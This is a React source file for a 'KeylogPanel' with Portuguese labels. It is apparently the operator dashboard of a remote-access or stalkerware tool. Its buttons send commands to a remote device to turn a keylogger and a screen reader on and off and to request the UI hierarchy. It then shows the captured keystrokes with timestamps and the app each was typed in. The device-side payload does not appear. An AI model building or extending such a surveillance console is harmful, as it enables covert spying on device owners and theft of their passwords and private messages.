import { useEffect, useRef } from 'react';
import useStore from '../../store/index.js';

export default function KeylogPanel({ deviceId, onBack, sendCmd }) {
  const keylogs     = useStore(s => s.deviceKeylogs);
  const endRef      = useRef(null);

  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [keylogs.length]);

  function fmtTime(ts) {
    if (!ts) return '';
    return new Date(ts).toLocaleTimeString();
  }

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">⌨ KEYLOGGER</div>
        <div className="row gap6">
          <button className="btn btn-ghost btn-sm" onClick={() => { sendCmd('GET_DEVICE_INFO'); }}>↺</button>
          <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
        </div>
      </div>

      {/* Toggle controls */}
      <div className="grid g2 mb12">
        <button className="btn btn-gold btn-block" onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: true })}>
          ⌨ ATIVAR
        </button>
        <button className="btn btn-red btn-block" onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: false })}>
          ⏹ DESATIVAR
        </button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>
          👁 SCREEN READER ON
        </button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>
          👁 SCREEN READER OFF
        </button>
      </div>

      <div className="txt-xs txt-dim mb8">{keylogs.length} registros</div>

      {/* Live log */}
      <div className="term" style={{ height: 350, overflowY: 'auto' }}>
        {keylogs.length === 0 && (
          <div style={{ color: 'var(--text3)', textAlign: 'center', paddingTop: 20 }}>Aguardando keylog...</div>
        )}
        {[...keylogs].reverse().map((k, i) => (
          <div key={i} className="log-line">
            <span className="log-ts">{fmtTime(k.ts)}</span>
            <span className="log-text log-keylog" style={{ wordBreak: 'break-all' }}>
              {typeof k.raw === 'string' ? k.raw.slice(0, 300) : JSON.stringify(k.raw).slice(0, 300)}
            </span>
            {k.app_context && (
              <span style={{ color: 'var(--text3)', fontSize: 10, marginLeft: 8, flexShrink: 0 }}>
                [{k.app_context}]
              </span>
            )}
          </div>
        ))}
        <div ref={endRef} />
      </div>

      {/* Hierarchy */}
      <div className="mt12">
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('REQUEST_HIERARCHY')}>
          🌳 REQUEST HIERARCHY
        </button>
      </div>
    </div>
  );
}
